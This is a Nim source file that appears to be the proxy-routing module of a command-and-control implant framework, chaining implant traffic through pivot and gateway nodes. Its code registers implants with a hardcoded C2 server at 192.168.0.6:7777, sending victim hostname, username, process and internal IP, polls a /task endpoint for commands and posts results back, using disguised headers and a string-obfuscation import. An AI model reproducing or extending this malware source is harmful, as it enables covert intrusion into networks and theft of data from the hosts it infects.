# Proxy Handler - HTTP Proxy routing system
{.push gcsafe.}
import json, puppy, httpclient, strutils, tables, random
import ../../util/[proxy_structures, route_manager]
import http_client_registry
from ../../adapters/http_client_adapter import getStoredImplantID
from ../../config/config_loader import parseConfig
from ../../util/strenc import obf
# from ../../core/relay/relay_protocol_agents import upstreamRelay  # TODO: Use in Phase 3

# Forward declarations
proc extractEncryptedMessage(commArray: JsonNode): string
proc sendRegistrationToC2(agentId: string, encryptedMessage: string, userAgent: string, allowKey: string): string

# Automatic role detection for current node
proc detectMyRole*(): ProxyRole =
  # Check if compiled with RELAY_ADDRESS flag
  let hasRelayFlag = when defined(RELAY_ADDRESS): true else: false
  
  # For Phase 1, use simple logic based on flags only
  # In later phases it will integrate with real relay server state
  
  when defined debug:
    echo "[PROXY] 🔍 Role detection:"
    echo "[PROXY] 🔍 - RELAY_ADDRESS defined: " & $hasRelayFlag
  
  # Enhanced role detection logic for Phase 3
  # TODO: In future phases, integrate with actual relay server state
  
  if hasRelayFlag:
    when defined debug:
      echo "[PROXY] 🎯 Detected role: PIVOT (relay compiled)"
    return PIVOT
  else:
    # Phase 3: Check if this could be a GATEWAY
    # GATEWAY = no RELAY_ADDRESS + relay server listening + no upstream connection
    # For now, use environment variable to simulate gateway detection
    when defined(GATEWAY_MODE):
      when defined debug:
        echo "[PROXY] 🎯 Detected role: GATEWAY (gateway mode)"
      return GATEWAY
    else:
      when defined debug:
        echo "[PROXY] 🎯 Detected role: CUMULUS_AGENT (standard agent)"
      return CUMULUS_AGENT

# Get current node information
proc getMyNodeInfo*(): tuple[agentId: string, ip: string] =
  var agentId = getStoredImplantID()
  
  # If no stored ID (Gateway case), generate a Gateway ID
  if agentId == "" or agentId.len == 0:
    agentId = "GATEWAY-" & $rand(100000..999999)
    when defined debug:
      echo "[PROXY] 🔧 Generated Gateway ID: " & agentId
  
  let ip = "127.0.0.1:8080"  # Default port for Phase 1
  
  when defined debug:
    echo "[PROXY] 📍 My node info - Agent ID: " & agentId & ", IP: " & ip
  
  return (agentId: agentId, ip: ip)

# PHASE 2: HTTP forwarding functions

proc forwardToUpstream*(jsonData: string): string =
  # Forward to upstream PIVOT/GATEWAY via HTTP /proxy endpoint
  try:
    when defined debug:
      echo "[PROXY] 🌐 === FORWARDING TO UPSTREAM ==="
      echo "[PROXY] 🌐 Data length: " & $jsonData.len
    
    # TODO: Get actual upstream address from relay configuration
    # For Phase 2, use hardcoded test address
    let upstreamUrl = "http://127.0.0.1:9090/proxy"
    
    when defined debug:
      echo "[PROXY] 🌐 Forwarding to: " & upstreamUrl
    
    # Use puppy to send HTTP POST request
    let response = post(upstreamUrl, headers = @[
      ("Content-Type", "application/json")
    ], body = jsonData)
    
    when defined debug:
      echo "[PROXY] 🌐 Response code: " & $response.code
      echo "[PROXY] 🌐 Response body: " & response.body
    
    if response.code == 200:
      return response.body
    else:
      return "ERROR: HTTP " & $response.code & " from upstream"
    
  except CatchableError as e:
    when defined debug:
      echo "[PROXY] ❌ Error forwarding to upstream: " & e.msg
    return "ERROR: " & e.msg

# PHASE 3: Extract final agent_id from communication_array
proc extractFinalAgentId*(commArray: JsonNode): string =
  try:
    when defined debug:
      echo "[PROXY] 🔍 === EXTRACTING FINAL AGENT_ID ==="
    
    # For direct Cumulus Agent connections, extract agent_id directly
    if commArray.kind == JArray and commArray.len > 0:
      let firstItem = commArray[0]
      
      when defined debug:
        echo "[PROXY] 🔍 First item JSON: " & $firstItem
        echo "[PROXY] 🔍 First item kind: " & $firstItem.kind
      
      # Check for direct agent_id (Cumulus Agent case)
      if firstItem.hasKey("agent_id"):
        let finalAgentId = firstItem["agent_id"].getStr()
        when defined debug:
          echo "[PROXY] 🔍 Direct agent_id extracted: " & finalAgentId
        return finalAgentId
      else:
        when defined debug:
          echo "[PROXY] 🔍 No 'agent_id' key found in first item"
      
      # Check for nested structure with nodeType (complex relay chain case)
      if firstItem.hasKey("nodeType") and firstItem["nodeType"].getStr() == "null":
        let finalAgentId = firstItem["agentId"].getStr()
        when defined debug:
          echo "[PROXY] 🔍 Nested agent_id extracted: " & finalAgentId
        return finalAgentId
      
      # Search in cumulus array for complex nested structures
      if firstItem.hasKey("cumulus") and firstItem["cumulus"].kind == JArray:
        for item in firstItem["cumulus"].getElems():
          if item.hasKey("agent_id"):
            let finalAgentId = item["agent_id"].getStr()
            when defined debug:
              echo "[PROXY] 🔍 Cumulus agent_id extracted: " & finalAgentId
            return finalAgentId
    
    when defined debug:
      echo "[PROXY] 🔍 No agent_id found in structure"
    return ""
    
  except CatchableError as e:
    when defined debug:
      echo "[PROXY] ❌ Error extracting agent_id: " & e.msg
    return ""

proc forwardToServer*(jsonData: string, listener: auto, userAgent: string, allowKey: string): string =
  # PHASE 3: Forward to main C2 server via RAW communication (not /proxy)
  try:
    when defined debug:
      echo "[PROXY] 🏢 === PHASE 3: RAW FORWARDING TO MAIN SERVER ==="
      echo "[PROXY] 🏢 Data length: " & $jsonData.len
    
    # Parse the communication_array to extract final agent_id
    let parsedJson = parseJson(jsonData)
    let commArray = parsedJson["communication_array"]
    let finalAgentId = extractFinalAgentId(commArray)
    
    if finalAgentId == "":
      when defined debug:
        echo "[PROXY] ❌ Could not extract final agent_id"
      return "ERROR: Could not extract final agent_id"
    
    when defined debug:
      echo "[PROXY] 🏢 Extracted final agent_id: " & finalAgentId
      echo "[PROXY] 🏢 Sending RAW to server (not /proxy endpoint)"
    
    # PHASE 4: Store route for bidirectional communication
    # For direct relay clients, create a synthetic route: Gateway -> RelayClient
    let myNodeInfo = getMyNodeInfo()
    let syntheticRoute = %*{
      "communication_array": [
        {
          "agentId": myNodeInfo.agentId,  # Gateway ID
          "cumulus": [
            {
              "agentId": finalAgentId  # Final relay client ID
            }
          ]
        }
      ]
    }
    
    when defined debug:
      echo "[PROXY] 🗺️ Creating synthetic route for relay client: " & myNodeInfo.agentId & " -> " & finalAgentId
    
    storeRoute(finalAgentId, syntheticRoute["communication_array"])
    
    # PHASE 3: Extract encrypted message and send to C2 server
    let encryptedMessage = extractEncryptedMessage(commArray)
    
    if encryptedMessage == "":
      when defined debug:
        echo "[PROXY] ❌ Could not extract encrypted message"
      return "ERROR: Could not extract encrypted message"
    
    when defined debug:
      echo "[PROXY] 🏢 Extracted encrypted message length: " & $encryptedMessage.len
      echo "[PROXY] 🏢 Sending to C2 server..."
    
    # Send registration to C2 server via proxy request
    let c2Response = sendRegistrationToC2(finalAgentId, encryptedMessage, userAgent, allowKey)
    
    when defined debug:
      echo "[PROXY] 🏢 C2 server response: " & c2Response
      echo "[PROXY] 🏢 ✅ Route stored for bidirectional communication"
    
    return c2Response
    
  except CatchableError as e:
    when defined debug:
      echo "[PROXY] ❌ Error in RAW forwarding: " & e.msg
    return "ERROR: " & e.msg

# PHASE 4: Downstream forwarding functions

proc forwardResponseDownstream*(agentId: string, response: string): string =
  # Forward server response back down the chain to original agent
  try:
    when defined debug:
      echo "[PROXY] ⬇️ === DOWNSTREAM FORWARDING ==="
      echo "[PROXY] ⬇️ Target agent: " & agentId
      echo "[PROXY] ⬇️ Response length: " & $response.len
    
    # Get stored route for this agent
    let route = getRoute(agentId)
    
    if route.len == 0:
      when defined debug:
        echo "[PROXY] ❌ No route found for agent: " & agentId
      return "ERROR: No route found for agent"
    
    when defined debug:
      echo "[PROXY] ⬇️ Found route: " & $route
    
    # Build route header for downstream forwarding
    let routeHeader = buildRouteHeader(route)
    
    when defined debug:
      echo "[PROXY] ⬇️ Route header: " & routeHeader
      echo "[PROXY] ⬇️ TODO: Send response downstream using route"
    
    # TODO: Implement actual downstream HTTP forwarding
    # For Phase 4, we'll simulate the downstream communication
    
    return "Response forwarded downstream via route: " & routeHeader
    
  except CatchableError as e:
    when defined debug:
      echo "[PROXY] ❌ Error in downstream forwarding: " & e.msg
    return "ERROR: " & e.msg

proc handleDownstreamResponse*(routeHeader: string, response: string): string =
  # Handle response coming from upstream with route header
  try:
    when defined debug:
      echo "[PROXY] ⬇️ === HANDLING DOWNSTREAM RESPONSE ==="
      echo "[PROXY] ⬇️ Route header: " & routeHeader
      echo "[PROXY] ⬇️ Response length: " & $response.len
    
    let route = parseRouteHeader(routeHeader)
    
    if route.len == 0:
      when defined debug:
        echo "[PROXY] ❌ Invalid route header"
      return "ERROR: Invalid route header"
    
    # Determine next hop in the chain
    let myAgentId = getStoredImplantID()
    var nextHop = ""
    
    # Find my position in the route and determine next downstream node
    for i, agentId in route:
      if agentId == myAgentId and i < route.len - 1:
        nextHop = route[i + 1]
        break
    
    if nextHop == "":
      when defined debug:
        echo "[PROXY] 🎯 Final destination reached"
      return "Response delivered to final agent"
    
    when defined debug:
      echo "[PROXY] ⬇️ Next hop: " & nextHop
      echo "[PROXY] ⬇️ TODO: Forward to next hop via HTTP"
    
    # TODO: Implement actual HTTP forwarding to next hop
    return "Response forwarded to next hop: " & nextHop
    
  except CatchableError as e:
    when defined debug:
      echo "[PROXY] ❌ Error handling downstream response: " & e.msg
    return "ERROR: " & e.msg

# PHASE 2: Auto-repackaging and forwarding function
proc repackageAndForward*(data: string, userAgent: string, allowKey: string): string =
  try:
    when defined debug:
      echo "[PROXY] 📦 === PHASE 2: AUTO-REPACKAGING ==="
      echo "[PROXY] 📦 Request data length: " & $data.len
    
    let myRole = detectMyRole()
    let nodeInfo = getMyNodeInfo()
    
    when defined debug:
      echo "[PROXY] 🎭 My role: " & $myRole
      echo "[PROXY] 🆔 My agent ID: " & nodeInfo.agentId
      echo "[PROXY] 🌐 My IP: " & nodeInfo.ip
    
    # Parse incoming communication_array
    let jsonData = parseJson(data)
    var commArray = jsonData["communication_array"]
    
    when defined debug:
      echo "[PROXY] 📊 Incoming array length: " & $commArray.len
    
    case myRole:
    of CUMULUS_AGENT:
      # CUMULUS_AGENT: When acting as Gateway, forward requests to server
      when defined debug:
        echo "[PROXY] 🔄 CUMULUS_AGENT: Acting as Gateway - Forwarding to server"
      
      # Forward directly to server without repackaging (Gateway behavior)
      # This happens when a CUMULUS_AGENT receives proxy requests (i.e., it's acting as Gateway)
      let rawResult = forwardToServer(data, nil, userAgent, allowKey)  # Forward original data
      
      when defined debug:
        echo "[PROXY] 📦 Direct forward result: " & rawResult
      
      return "GATEWAY_FORWARDED - " & rawResult
      
    of PIVOT:
      # PIVOT: Add self to array and forward upstream
      when defined debug:
        echo "[PROXY] 🔄 PIVOT: Adding self to array and forwarding upstream"
      
      # Create my node entry
      let myNode = %*{
        "nodeType": "node",
        "agentId": nodeInfo.agentId,
        "ip": nodeInfo.ip,
        "cumulus": commArray
      }
      
      # Create new communication_array with my node
      let newArray = %*{
        "communication_array": [myNode]
      }
      
      when defined debug:
        echo "[PROXY] 📦 Repackaged array created"
        echo "[PROXY] 🔄 Forwarding to upstream..."
      
      # Forward the repackaged data to upstream
      let forwardResult = forwardToUpstream($newArray)
      
      when defined debug:
        echo "[PROXY] 📦 Forward result: " & forwardResult
      
      return "PIVOT - Repackaged and forwarded: " & forwardResult
      
    of GATEWAY:
      # GATEWAY: Add self to array and send to main server
      when defined debug:
        echo "[PROXY] 🔄 GATEWAY: Adding self to array and sending to server"
      
      # Create my node entry  
      let myNode = %*{
        "nodeType": "node",
        "agentId": nodeInfo.agentId,
        "ip": nodeInfo.ip,
        "cumulus": commArray
      }
      
      # Create new communication_array with my node
      let newArray = %*{
        "communication_array": [myNode]
      }
      
      when defined debug:
        echo "[PROXY] 📦 Repackaged for server"
        echo "[PROXY] 🔄 Sending RAW to main server..."
        echo "[PROXY] 📦 Final array: " & ($newArray)[0..100] & "..."
      
      # PHASE 3: Forward to server using RAW communication
      let rawResult = forwardToServer($newArray, nil, userAgent, allowKey)  # nil for now, will integrate listener later
      
      when defined debug:
        echo "[PROXY] 📦 RAW forward result: " & rawResult
      
      return "GATEWAY - " & rawResult
      
  except JsonParsingError:
    when defined debug:
      echo "[PROXY] ❌ JSON parsing error: " & getCurrentExceptionMsg()
    return "ERROR: Invalid JSON format"
  except:
    let msg = getCurrentExceptionMsg()
    when defined debug:
      echo "[PROXY] ❌ Unexpected error: " & msg
    return "ERROR: " & msg

# Handle Gateway registration request - proxy standard C2 registration
proc handleGatewayRegistration(requestData: JsonNode, userAgent: string, allowKey: string): string =
  try:
    when defined debug:
      echo "[PROXY] 🔐 === HANDLING GATEWAY REGISTRATION ==="
    
    # Extract system info from request
    if not requestData.hasKey("system_info"):
      return "ERROR: Missing system_info in registration request"
    
    let systemInfo = requestData["system_info"]
    let relayClientId = if requestData.hasKey("relay_client_id"): requestData["relay_client_id"].getStr() else: ""
    
    when defined debug:
      echo "[PROXY] 🔐 Relay client ID: " & relayClientId
      echo "[PROXY] 🔐 System info: " & $systemInfo
      echo "[PROXY] 🔐 Config values:"
      echo "[PROXY] 🔐 - userAgent from config: '" & userAgent & "'"
      echo "[PROXY] 🔐 - allowKey from config: '" & allowKey & "'"
    
    # Step 1: GET request to C2 to get agent ID and encryption key
    let c2Host = "192.168.0.6" # Hardcoded for now
    let c2Port = "7777"
    let registerUrl = "http://" & c2Host & ":" & c2Port & "/register"
    
    when defined debug:
      echo "[PROXY] 🔐 Step 1: GET registration from C2: " & registerUrl
      echo "[PROXY] 🔐 Headers to send:"
      echo "[PROXY] 🔐 - User-Agent: '" & userAgent & "'"
      echo "[PROXY] 🔐 - X-Correlation-ID: '" & allowKey & "'"
    
    let getClient = newHttpClient(timeout = 30000)
    getClient.headers = newHttpHeaders([
      ("User-Agent", userAgent),  # From config.toml
      ("X-Correlation-ID", allowKey),  # From config.toml
      ("Content-Type", "application/json"),
      ("Accept", "*/*")
    ])
    
    let getResponse = getClient.get(registerUrl)
    getClient.close()
    
    when defined debug:
      echo "[PROXY] 🔐 GET response status: " & getResponse.status
      echo "[PROXY] 🔐 GET response body: " & getResponse.body
    
    if getResponse.status != "200 OK":
      return "ERROR: C2 registration GET failed - " & getResponse.status
    
    # Parse GET response to get agent ID and encryption key
    let getResponseJson = parseJson(getResponse.body)
    if not (getResponseJson.hasKey("id") and getResponseJson.hasKey("k")):
      return "ERROR: C2 registration response missing id/k fields"
    
    let agentId = getResponseJson["id"].getStr()
    let encryptionKey = getResponseJson["k"].getStr()
    
    when defined debug:
      echo "[PROXY] 🔐 Assigned agent ID: " & agentId
      echo "[PROXY] 🔐 Encryption key received (length: " & $encryptionKey.len & ")"
    
    # Step 2: POST request to activate the implant
    when defined debug:
      echo "[PROXY] 🔐 Step 2: POST activation to C2: " & registerUrl
    
    let activationData = %*{
      "data": %*{
        "hostname": systemInfo["hostname"].getStr(),
        "username": systemInfo["username"].getStr(),
        "os": systemInfo["os"].getStr(),
        "pid": systemInfo["pid"].getInt(),
        "process": systemInfo["process"].getStr(),
        "internal_ip": systemInfo["internal_ip"].getStr()
      }
    }
    
    let postClient = newHttpClient(timeout = 30000)
    postClient.headers = newHttpHeaders([
      ("Content-Type", "application/json"),
      ("User-Agent", userAgent),  # From config.toml
      ("X-Correlation-ID", allowKey),  # From config.toml
      ("X-Request-ID", agentId)  # Use the assigned agent ID
    ])
    
    let postResponse = postClient.post(registerUrl, $activationData)
    postClient.close()
    
    when defined debug:
      echo "[PROXY] 🔐 POST response status: " & postResponse.status
      echo "[PROXY] 🔐 POST response body: " & postResponse.body
    
    if postResponse.status != "200 OK":
      return "ERROR: C2 activation POST failed - " & postResponse.status
    
    # Return the agent ID to the relay client
    let registrationResponse = %*{
      "id": agentId,
      "k": encryptionKey,
      "status": "activated"  # Changed to indicate full activation
    }
    
    when defined debug:
      echo "[PROXY] 🔐 ✅ Registration successful, returning: " & $registrationResponse
    
    return $registrationResponse
    
  except Exception as e:
    when defined debug:
      echo "[PROXY] 🔐 ❌ Gateway registration error: " & e.msg
    return "ERROR: Gateway registration failed - " & e.msg

# Basic proxy request handling function (updated for Phase 2)
proc handleProxyRequest*(data: string, userAgent: string, allowKey: string): string =
  when defined debug:
    echo "[PROXY] 🚨 === ENTERING handleProxyRequest ==="
    echo "[PROXY] 🚨 Raw data: " & data
  
  try:
    when defined debug:
      echo "[PROXY] 📥 === HANDLING PROXY REQUEST ==="
      echo "[PROXY] 📥 Request data length: " & $data.len
      echo "[PROXY] 📥 First 100 chars: " & (if data.len > 100: data[0..99] else: data)
    
    # Parse incoming JSON first
    let jsonData = parseJson(data)
    
    when defined debug:
      echo "[PROXY] 🔍 JSON parsed successfully"
      if jsonData.hasKey("command"):
        echo "[PROXY] 🔍 Command field found: " & jsonData["command"].getStr()
      else:
        echo "[PROXY] 🔍 No command field found"
    
    # Check for special Gateway registration command BEFORE auto-registration
    if jsonData.hasKey("command") and jsonData["command"].getStr() == "GATEWAY_REGISTER_REQUEST":
      when defined debug:
        echo "[PROXY] 🔐 Handling Gateway registration request"
      return handleGatewayRegistration(jsonData, userAgent, allowKey)
    
    # PHASE 1: Auto-register HTTP client in Gateway (only for normal requests)
    autoRegisterFromProxy(data)
    
    # Detect my role
    let myRole = detectMyRole()
    let nodeInfo = getMyNodeInfo()
    
    when defined debug:
      echo "[PROXY] 🎭 My role: " & $myRole
      echo "[PROXY] 🆔 My agent ID: " & nodeInfo.agentId
      echo "[PROXY] 🌐 My IP: " & nodeInfo.ip
    
    # Validate JSON structure
    if not jsonData.hasKey("communication_array"):
      when defined debug:
        echo "[PROXY] ❌ Missing communication_array field"
      return "ERROR: Missing communication_array field"
    
    let commArray = jsonData["communication_array"]
    if commArray.kind != JArray:
      when defined debug:
        echo "[PROXY] ❌ communication_array is not an array"
      return "ERROR: communication_array must be an array"
    
    when defined debug:
      echo "[PROXY] ✅ JSON validation passed"
      echo "[PROXY] 📊 Array length: " & $commArray.len
      echo "[PROXY] 🎯 Processing completed successfully"
    
    # PHASE 2: Use repackaging function
    return repackageAndForward(data, userAgent, allowKey)
    
  except JsonParsingError:
    when defined debug:
      echo "[PROXY] ❌ JSON parsing error: " & getCurrentExceptionMsg()
    return "ERROR: Invalid JSON format"
  except:
    let msg = getCurrentExceptionMsg()
    when defined debug:
      echo "[PROXY] ❌ Unexpected error: " & msg
    return "ERROR: " & msg


# Helper function to extract encrypted message from communication array
proc extractEncryptedMessage(commArray: JsonNode): string =
  try:
    if commArray.kind == JArray and commArray.len > 0:
      let firstItem = commArray[0]
      if firstItem.hasKey("encrypted_message"):
        return firstItem["encrypted_message"].getStr()
    return ""
  except:
    when defined debug:
      echo "[PROXY] ❌ Error extracting encrypted message: " & getCurrentExceptionMsg()
    return ""

# Function to send registration to C2 server  
proc sendRegistrationToC2(agentId: string, encryptedMessage: string, userAgent: string, allowKey: string): string =
  try:
    # Use hardcoded C2 host for now (will be from config in the future)
    let c2Host = "192.168.0.6"  # From config: implantCallbackIp
    let c2Port = "7777"  # C2 server port
    
    when defined debug:
      echo "[PROXY] 🏢 Forwarding to C2: " & c2Host & ":" & c2Port
      echo "[PROXY] 🏢 Agent ID: " & agentId
      echo "[PROXY] 🏢 Message: " & encryptedMessage[0..min(50, encryptedMessage.len-1)] & "..."
    
    # Check if this is a registration request
    if "REGISTER_REQUEST" in encryptedMessage:
      # Extract registration data and create proper registration request
      let url = "http://" & c2Host & ":" & c2Port & "/register"
      
      # Create registration payload
      let registrationData = %*{
        "agent_id": agentId,
        "data": encryptedMessage
      }
      
      when defined debug:
        echo "[PROXY] 🏢 Sending registration to: " & url
      
      # Send HTTP POST to C2 server
      let client = newHttpClient(timeout = 30000)
      client.headers = newHttpHeaders([
        ("Content-Type", "application/json"),
        ("User-Agent", userAgent),  # From config.toml
        ("X-Correlation-ID", allowKey),  # From config.toml
        ("X-Request-ID", agentId)  # Required by C2
      ])
      let response = client.post(url, $registrationData)
      client.close()
      
      when defined debug:
        echo "[PROXY] 🏢 C2 response status: " & response.status
        echo "[PROXY] 🏢 C2 response body: " & response.body
      
      if response.status == "200 OK":
        # Parse response to extract assigned ID
        try:
          let responseJson = parseJson(response.body)
          if responseJson.hasKey("assigned_id"):
            let assignedId = responseJson["assigned_id"].getStr()
            when defined debug:
              echo "[PROXY] 🏢 ✅ C2 assigned ID: " & assignedId
            return $(%*{"assigned_id": assignedId})
          else:
            return response.body
        except:
          return response.body
      else:
        return "ERROR: C2 server error - " & response.status
    else:
      # Handle other message types (task requests, results, etc.)
      if "COMMAND_REQUEST" in encryptedMessage:
        # This is a task polling request
        let taskUrl = "http://" & c2Host & ":" & c2Port & "/task"
        
        # Configuration passed as parameters
        
        when defined debug:
          echo "[PROXY] 🏢 Forwarding task request to: " & taskUrl
        
        let taskClient = newHttpClient(timeout = 30000)
        taskClient.headers = newHttpHeaders([
          ("User-Agent", userAgent),  # From config.toml
          ("X-Correlation-ID", allowKey),  # From config.toml
          ("X-Request-ID", agentId),  # Required agent ID
          ("Accept", "*/*")
        ])
        
        let taskResponse = taskClient.get(taskUrl)
        taskClient.close()
        
        when defined debug:
          echo "[PROXY] 🏢 Task response: " & taskResponse.status
          echo "[PROXY] 🏢 Task body: " & taskResponse.body
        
        return taskResponse.body
        
      else:
        # This might be a result submission
        let resultUrl = "http://" & c2Host & ":" & c2Port & "/result"
        
        when defined debug:
          echo "[PROXY] 🏢 Forwarding result to: " & resultUrl
        
        let resultData = %*{
          "data": encryptedMessage
        }
        
        # Configuration passed as parameters
        
        let resultClient = newHttpClient(timeout = 30000)
        resultClient.headers = newHttpHeaders([
          ("Content-Type", "application/json"),
          ("User-Agent", userAgent),  # From config.toml
          ("X-Correlation-ID", allowKey),  # From config.toml
          ("X-Request-ID", agentId)  # Required agent ID
        ])
        
        let resultResponse = resultClient.post(resultUrl, $resultData)
        resultClient.close()
        
        when defined debug:
          echo "[PROXY] 🏢 Result response: " & resultResponse.status
          
        return resultResponse.body
    
  except Exception as e:
    when defined debug:
      echo "[PROXY] ❌ Error sending to C2: " & e.msg
    return "ERROR: Failed to contact C2 server - " & e.msg

{.pop.}
